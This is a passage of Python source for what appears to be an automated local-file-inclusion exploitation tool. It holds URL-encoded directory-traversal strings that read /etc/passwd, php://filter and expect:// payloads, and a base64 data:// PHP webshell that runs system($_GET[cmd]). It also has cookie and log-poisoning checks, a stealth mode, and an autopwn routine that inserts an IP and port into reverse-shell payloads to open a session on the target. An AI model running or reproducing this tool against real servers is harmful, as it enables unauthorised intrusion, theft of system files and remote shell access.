...
class Payload:
    ...
    def __init__(self, url, outfile, creds, headers, cookies, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], override_poc=False, verbosity=1, proxies=False, crawler=False, attempt_shell=False, mode=0, force=False, batch=None, stealth=False):
        # Comment out to stop suppressing warnings.
        ...
        self.rce_urls = []
        self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E",
                                   "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66", "&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;", "\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57"]
        ...
        self.filterPaths = ["%2Fetc%2Fpasswd", quote(
            "index"), quote("index.php"), quote("index.html")]
        self.filterBase = quote(
            "php://filter/read=convert.base64-encode/resource=")

        # Headers. One is without url encoding beacause it encodes also the base64 and the server doesn't like that
        self.phpHeaders = [quote(
            "expect://id"), "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id"]
    ...
    def InvokeShell(self, exploit, payload):
        ...
        time.sleep(2)
        print(colored("[+]", 'green') +
              " Triggering payload... " + exploit + payload)
        self.hit(exploit + payload)
        time.sleep(2)
        if not self.conn:
            print(colored("[-]", 'red') +
                  " Exploit completed but no sessions were created!")
            if self.batch == None:
                print(
                    colored("Do you want to try other payloads? (Y/n) ", 'yellow'), end='')
                ans = str(input())
                if 'n' in ans.lower():
                    os._exit(0)
            else:
    ...
    def GetPayloads(self, ip, port):
        ...
        with open(str(cwd) + "/misc.txt") as handle:
            ...
            for i in range(len(payloads)):
                payloads[i] = payloads[i].replace(
                    '{ip}', ip).replace('{port}', str(port))
        return payloads
    ...
    def Attack(self, attempt_shell=False, mode=0, force=False):
        ...
        if attempt_shell:
            self.autopwn(attempt_shell, self.rce_urls,
                         self.rce_urls, self.rce_urls, mode)
    ...
    def autopwn(self, attempt_shell, cookieres, headerres, logres, mode=0):
        ...
        if not cookieres and not headerres and not logres:
            print(colored("[-]", 'red') +
                  " No RCE Found. Autopwn impossible...")
            return
        ...
        if logres:
            ...
            print(colored(f"[+]", 'green') +
                  " Attempting to pwn through vulnerable log file: " + log)
            exploit = log + f'&cmd='

        elif headerres:
            exploit = headerres[0][:-2]
            print(colored(f"[+]", 'green') +
                  " Attempting to pwn through vulnerable header: {header}")

        elif cookieres:
            exploit = headerres[0][:-2]
            print(colored(f"[+]", 'green') +
                  " Attempting to pwn through vulnerable cookie: {cookie}")

        ExploitThread = threading.Thread(target=self.InvokeShell, args=[
                                         exploit, payload])  # It works, don't touch it!
        ExploitThread.start()
    ...
    def hit(self, url):
        if self.stealth:
            # Sleep for a random interval of seconds (between 2 and 6) per request to be more stealthy
        ...
        try:
            ...
            if self.headers is not None and isinstance(self.headers, str):
                self.headers = self.string_to_dict(
                    self.headers)  # Convert to dict
            if self.cookies is not None and isinstance(self.cookies, str):
                self.cookies = self.string_to_dict(
                    self.cookies)  # Convert to dict
            ...
            if self.creds is not None:
                ...
                response = requests.get(
                    url, headers=self.headers, cookies=self.cookies, verify=False, auth=HTTPBasicAuth(user, passwd))
            else:
    ...
    def string_to_dict(self, header_or_cookie_string):
        if header_or_cookie_string is None:
            return None
        if isinstance(header_or_cookie_string, dict):
            return dict(header_or_cookie_string)

        # Split the string into individual key-value pairs, then split each pair by the first ':' for headers or '=' for cookies
        result = {}
        items = header_or_cookie_string.split(
            ';') if '=' in header_or_cookie_string else header_or_cookie_string.split('\n')
    ...
    def urlCheck(self):
        ...
        self.domain = urllib.parse.urlparse(
            self.url).scheme + '://' + urllib.parse.urlparse(self.url).netloc

        # Convert headers and cookies from string to dictionary if they're in string format
        headers = self.headers if isinstance(self.headers, dict) else self.string_to_dict(
            self.headers) if hasattr(self, 'headers') else fetchUA()
        cookies = self.cookies if isinstance(self.cookies, dict) else self.string_to_dict(
            self.cookies) if hasattr(self, 'cookies') else None

        try:
            print("Checking Remote Server Health")
            if self.proxies:
                # Include the headers and cookies in the request
                ret = requests.get(self.domain, headers=headers,
                                   cookies=cookies, proxies=fetch_proxy(), verify=False)
            ...
            print(colored('[!]', 'yellow', attrs=['bold']) +
                  ' The URL format must be http://[URL]?[something]=')
            return False
    ...
    def cred(self, url):
        ...
        user = list_creds[0]
        passwd = list_creds[1]
        ret = requests.get(url, headers=fetchUA(), verify=False,
    ...
    def check_traversal(self, traversal, params=None, hit=False):
        ...
        for param in params_to_check:
            ...
            new_query = urllib.parse.parse_qs(
                urllib.parse.urlparse(self.url).query).copy()
            ...
            if 'root:x' in clean.lower():
                print(colored('[+]', 'green', attrs=['bold']) +
                      ' Directory traversal found with ' + compUrl)
                if self.outfile is not None:
                    self.outfile.write(colored(
                        '[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl + '\n')
            else:
                if self.verbosity > 0:
                    print(colored('[-]', 'red', attrs=['bold']
                                  ) + f' {compUrl} payload failed.')
            ...
            for word in words:
                ...
                if base.__contains__('<?php') or base.__contains__('<script'):
                    print(colored('[+]', 'green', attrs=['bold']) +
                          ' Files might be able to be retrieved with php filter like so (encoded in base64) ' + compUrl)
                    if self.outfile is not None:
                        self.outfile.write(colored('[+]', 'green', attrs=[
                                           'bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl + '\n')
                    else:
                        if self.verbosity > 0:
                            print(
                                colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')

            if "uid=" in clean.lower() and hit:  # hitApache and hitNginx check
                print(colored('[+]', 'green', attrs=['bold']) +
                      ' Remote code execution (RCE) found with log poisong with the path ' + compUrl)
                if self.outfile is not None:
                    self.outfile.write(colored('[+]', 'green', attrs=[
                                       'bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + compUrl + '\n')
        ...
        for traversal in self.linux_dirTraversal:
            for poc in self.poc:
                ...
                thread = threading.Thread(
                    target=self.check_traversal, args=(payload, None, False))
    ...
    def headerCheck(self):
        ...
        for header in self.phpHeaders:
            ...
            if 'uid=' in clean.lower():
                print(colored('[+]', 'green', attrs=['bold']) +
                      ' Remote code execution (RCE) found with ' + compUrl)
                if self.outfile is not None:
                    self.outfile.write(colored(
                        '[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl + '\n')
    ...
    def cookieCheck(self):
        if self.verbosity > 1:
            cookies = self.cookies if isinstance(self.cookies, dict) else self.string_to_dict(
                self.cookies) if hasattr(self, 'cookies') else None
            print(colored('[*]', 'yellow', attrs=['bold']) +
                  ' Testing: PHPSESSID cookie injection')
        s = requests.Session()
        s.verify = False
        ...
        for cookie in cookies:
            if 'phpsessid' in cookie.lower():
                ...
                clean = self.hit(compUrl)
                if 'uid=' in clean.lower():
                    print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' +
                          self.cookiePath + '[cookie value] can be poisoned')
                    if self.outfile is not None:
                        self.outfile.write(colored('[+]', 'green', attrs=[
                                           'bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + self.cookiePath + '[cookie value] can be poisoned\n')
                    self.rce_urls.append(compUrl)  # Change rce to rce_urls
                else:
                    if self.verbosity > 0:
                        print(colored('[-]', 'red', attrs=['bold']
    ...
    def logPoisonCheck(self):
        ...
        if self.cookies is not None:
            cookies = self.cookies if isinstance(self.cookies, dict) else self.string_to_dict(
                self.cookies) if hasattr(self, 'cookies') else None
            response = requests.get(
                self.domain, headers=headers, cookies=cookies, verify=False)
        else:
            response = requests.get(self.url, headers=headers, verify=False)
        if self.verbosity > 1:
            print(colored('[*]', 'yellow', attrs=['bold']) +
                  ' Testing: Log Poisoning based on server type.')

        # Check to see if the server leaks a Server Header.
        if not 'Server' in response.headers.keys():
            print(colored(
                '[-]', 'red') + " Server does not leak the Server Header. It's impossible to tell if it's running nginx or apache.")
            if self.batch == False:
                return False
            else:
                if self.batch == True:
                    ...
                    ans = input(colored(
                        "Do you want to hit every known server type? (y/N) ", 'yellow')).strip().lower()
        ...
        if 'Server' not in response.headers:
            print(colored(
                '[-]', 'red') + " Server header is missing. Cannot determine server type.")
            return False
        ...
        if "apache" in response.headers['Server'].lower() or 'litespeed' in response.headers['Server'].lower():
            ...
            print(colored('[-]', 'red', attrs=['bold']) + " The server type " +
                  response.headers['Server'] + " is not supported!!!")
        return False

    def hitApache(self):
        if self.verbosity > 1:
            print(colored('[*]', 'yellow', attrs=['bold']) +
                  ' Server Identified as Apache2')
        ...
        for d_path in self.linux_dirTraversal:
            for l_path in logPath:
                ...
                thread = threading.Thread(
                    target=self.check_traversal, args=(traversal_path, False, True))
                threads.append(thread)
                thread.start()
    ...
    def hitNginx(self):
        ...
        for d_path in self.linux_dirTraversal:
            for l_path in log:
                ...
                # Use the check_traversal method to check for RCE
                thread = threading.Thread(
                    target=self.check_traversal, args=(traversal_path, None, True))
                threads.append(thread)
                thread.start()
